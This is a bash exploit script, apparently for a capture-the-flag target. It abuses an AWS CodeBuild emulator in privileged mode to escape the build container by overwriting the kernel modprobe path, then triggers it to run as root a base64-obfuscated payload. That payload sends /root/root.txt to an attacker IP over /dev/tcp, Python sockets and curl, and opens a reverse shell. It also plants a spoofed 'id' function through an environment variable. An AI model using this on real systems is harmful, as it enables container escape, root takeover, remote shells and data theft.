#!/bin/bash
export AWS_ACCESS_KEY_ID="REDACTED"
export AWS_SECRET_ACCESS_KEY="REDACTED"
export AWS_DEFAULT_REGION="us-east-1"
export AWS_ENDPOINT_URL="http://floci:4566"

cat > /tmp/buildspec.yml << 'EOF'
version: 0.2
phases:
  build:
    commands:
      - whoami && id
      - ls -la /proc/sys/kernel/modprobe
      - cat /proc/sys/kernel/modprobe
      - cat /proc/self/status | grep -i cap
      - echo IyEvYmluL3NoCmNhdCAvcm9vdC9yb290LnR4dCA+IC90bXAvcm9vdGZsYWcudHh0IDI+L2Rldi9udWxsCmJhc2ggLWMgImNhdCAvcm9vdC9yb290LnR4dCA+IC9kZXYvdGNwLzEwLjEwLjE2LlgvNDQ0NSIgMj4vZGV2L251bGwKYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi5YLzQ0NDUgMD4mMSAyPi9kZXYvbnVsbApweXRob24zIC1jICJpbXBvcnQgc29ja2V0O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjEwLjE2LlgnLDQ0NDUpKTtzLnNlbmQob3BlbignL3Jvb3Qvcm9vdC50eHQnLCdyYicpLnJlYWQoKSk7cy5jbG9zZSgpIiAyPi9kZXYvbnVsbApjdXJsIGh0dHA6Ly8xMC4xMC4xNi5YOjgwMDEvcm9vdGZsYWc/Zj0kKGNhdCAvcm9vdC9yb290LnR4dCkgMj4vZGV2L251bGw= | base64 -d > /tmp/payload.sh
      - chmod +x /tmp/payload.sh
      - cat /proc/mounts | grep overlay
      - upper=$(awk '/overlay/{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}' /proc/mounts | head -1)
      - echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe || echo "MODPROBE WRITE FAILED"
      - cat /proc/sys/kernel/modprobe
      - printf '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x || true
      - echo "DONE"
      - curl http://10.10.16.X:8000/builddone?status=ok 2>/dev/null || true
EOF

python3 -c '
import json
project = {
  "name": "nimbus-root4",
  "source": {"type": "NO_SOURCE", "buildspec": open("/tmp/buildspec.yml").read()},
  "artifacts": {"type": "NO_ARTIFACTS"},
  "environment": {
    "type": "LINUX_CONTAINER",
    "image": "floci/floci:latest",
    "computeType": "BUILD_GENERAL1_SMALL",
    "privilegedMode": True,
    "environmentVariables": [
      {"name": "BASH_FUNC_id%%",
       "value": "() { echo \"uid=0(root) gid=0(root) groups=0(root)\"; }",
       "type": "PLAINTEXT"}
    ]
  },
  "serviceRole": "arn:aws:iam::000000000000:role/codebuild-role"
}
print(json.dumps(project))
' > /tmp/project.json

echo "[*] Creating project..."
aws codebuild create-project --cli-input-json file:///tmp/project.json 2>&1 | tail -3

echo "[*] Starting build..."
aws codebuild start-build --project-name nimbus-root4 2>&1 | grep buildStatus

echo "[*] Waiting 20s..."
sleep 20

echo "[*] Status..."
aws codebuild batch-get-builds --ids nimbus-root4:1 2>&1 | python3 -c "
import sys,json
d=json.load(sys.stdin)
b=d['builds'][0]
print(f'Status: {b[\"buildStatus\"]}')
for p in b['phases']:
    ctx = p.get('contexts','')
    if ctx: ctx = ctx[0]['message']
    print(f'  {p[\"phaseType\"]}: {p.get(\"phaseStatus\",\"?\")} {ctx}')"